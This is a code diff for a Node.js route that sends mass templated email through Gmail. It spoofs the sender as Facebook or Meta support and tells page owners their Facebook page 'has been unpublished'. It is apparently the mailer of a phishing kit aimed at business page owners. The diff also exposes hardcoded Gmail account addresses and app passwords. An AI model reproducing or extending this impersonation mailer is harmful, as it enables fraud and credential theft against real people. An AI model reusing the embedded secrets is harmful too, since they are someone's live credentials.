@@ -4,11 +4,12 @@ const nodemailer = require("nodemailer");
 const hbs = require("nodemailer-express-handlebars");
 
 router.get("/send-email", (req, res) => {
+  console.log(req.body,"----------------------");
   const transporter = nodemailer.createTransport({
     service: "Gmail",
     auth: {
-      user: "tai.na@jadelux.store", // Điền email của bạn
-      pass: "wxuphenxmhlicqzw", // Điền mật khẩu của bạn
+      user: "phamminhankfs13@gmail.com", // Điền email của bạn
+      pass: "hshzgsizikxatayl", // Điền mật khẩu của bạn
     },
   });
   transporter.use(
@@ -25,16 +26,14 @@ router.get("/send-email", (req, res) => {
     })
   );
   const mailOptions = {
-    from: "META CORP <support@fb.com>",
-    to: req.body?.BussinessEmail,
-    subject: `The ${req.body?.FacebookPageName} Page has been unpublished.`,
+    from: " SUPPORT FACEBOOK <support@fb.com>",
+    to: req.query?.BussinessEmail,
+    subject: `Your page has been unpublished.`,
     text: "WARNING",
     template: "./email",
     context: {
-      Fullname: req.body?.Fullname,
-      BussinessEmail: req.body?.BussinessEmail,
-      FacebookPageName: req.body?.FacebookPageName,
-      TimeSend: req.body?.TimeSend,
+      BussinessEmail: req.query?.BussinessEmail,
+      TimeSend: req.query?.TimeSend,
     },
   };
 
